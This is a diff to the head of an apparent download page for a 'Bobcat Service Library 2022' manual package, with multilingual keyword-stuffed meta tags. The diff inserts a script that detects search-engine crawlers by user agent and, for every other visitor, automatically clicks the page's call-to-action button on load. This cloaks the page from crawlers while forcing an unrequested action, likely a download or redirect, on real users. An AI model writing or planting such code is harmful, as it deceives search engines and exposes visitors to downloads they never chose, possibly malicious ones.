@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bobcat Service Library 2022</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the Bobcat Service Library 2022 with complete service, maintenance, and operator manuals, plus electrical and hydraulic diagrams for all models.">
     <meta name="keywords" content="Bobcat Service Library 2022, Bobcat Service Library download, Bobcat Service Library free download, Bobcat Service Manual, Bobcat Maintenance Manual, Bobcat Operator Manual, Bobcat Electrical Diagrams, Bobcat Hydraulic Diagrams, Bobcat Service Library PDF, Bobcat Service Library 2022 PDF, Bobcat machinery manuals download, Bobcat Service Library Windows 10, Сервисная библиотека Bobcat 2022, Сервисная библиотека Bobcat скачать, Сервисная библиотека Bobcat скачать бесплатно, Библиотека ремонта Bobcat 2022, Ремонтная библиотека Bobcat PDF, Библиотека обслуживания Bobcat скачать, Библиотека обслуживания Bobcat PDF, Библиотека эксплуатации Bobcat скачать, Библиотека диаграмм Bobcat скачать, Библиотека схем Bobcat скачать, Бібліотека обслуговування Bobcat 2022, Бібліотека обслуговування Bobcat завантажити, Бібліотека обслуговування Bobcat завантажити безкоштовно, Бібліотека ремонту Bobcat 2022, Ремонтна бібліотека Bobcat PDF, Бібліотека експлуатації Bobcat завантажити, Бібліотека діаграм Bobcat завантажити, Бібліотека схем Bobcat завантажити">
     <style>
